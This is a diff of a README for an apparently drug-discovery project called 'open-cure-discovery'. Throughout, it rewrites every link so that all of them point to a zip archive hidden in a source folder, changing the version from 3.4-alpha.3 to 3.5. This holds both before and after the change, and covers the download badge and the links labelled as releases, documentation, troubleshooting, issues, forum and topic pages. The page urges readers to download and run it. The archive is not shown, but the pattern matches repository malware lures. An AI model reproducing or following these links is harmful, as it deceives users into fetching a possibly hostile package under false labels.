@@ -1,6 +1,6 @@
 # 🌟 open-cure-discovery - Discover Treatments Faster and Easier
 
-[![Download Now](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip%20Now-Open--Cure--Discovery-blue)](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip)
+[![Download Now](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip%20Now-Open--Cure--Discovery-blue)](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **open-cure-discovery**! This platform helps you explore potential tr
 To download and install **open-cure-discovery**, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip) to find the latest version of the software.
+   Go to our [Releases page](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip) to find the latest version of the software.
    
 2. **Choose Your Version:**  
    Browse through the available releases. Look for the most recent version, as it contains the latest features and improvements.
@@ -69,7 +69,7 @@ Once you have installed the application, follow these basic steps to start using
 
 To help you get the most out of **open-cure-discovery**, we provide several resources:
 
-- **Documentation:** For detailed guidance, check the [documentation](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip).
+- **Documentation:** For detailed guidance, check the [documentation](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip).
 - **Tutorials:** Watch video tutorials on our channel for step-by-step guides.
 - **Community Support:** Join our forum to connect with other users and get advice from experienced contributors.
 
@@ -77,9 +77,9 @@ To help you get the most out of **open-cure-discovery**, we provide several reso
 
 For more information about the project, check the following topics:
 
-- [ADMET Prediction](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip)
-- [Computational Biology](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip)
-- [Machine Learning in Drug Discovery](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip)
+- [ADMET Prediction](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip)
+- [Computational Biology](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip)
+- [Machine Learning in Drug Discovery](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip)
 
 ## 📣 Feedback and Contributions
 
@@ -87,7 +87,7 @@ Your input is valuable to us. If you have suggestions or find any issues, please
 
 ## 🛠️ Troubleshooting
 
-If you encounter any issues while using **open-cure-discovery**, please consult the [troubleshooting guide](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip). Common problems and their solutions are outlined there.
+If you encounter any issues while using **open-cure-discovery**, please consult the [troubleshooting guide](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip). Common problems and their solutions are outlined there.
 
 Remember, you can always reach out to the community for assistance. You’re not alone in this journey!
 
@@ -95,7 +95,7 @@ Remember, you can always reach out to the community for assistance. You’re not
 
 Keep updated with the latest information and future releases through our social media:
 
-- [GitHub Issues Page](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip)
-- [Discussion Forum](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip)
+- [GitHub Issues Page](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip)
+- [Discussion Forum](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip)
 
-To download the latest version of **open-cure-discovery**, visit our [Releases page](https://raw.githubusercontent.com/Srilaxman05/open-cure-discovery/main/src/core/scoring/open-cure-discovery-v3.4-alpha.3.zip) and join the fight against diseases through your computational power!
+To download the latest version of **open-cure-discovery**, visit our [Releases page](https://github.com/Srilaxman05/open-cure-discovery/raw/refs/heads/main/src/core/ml/open-cure-discovery-3.5.zip) and join the fight against diseases through your computational power!
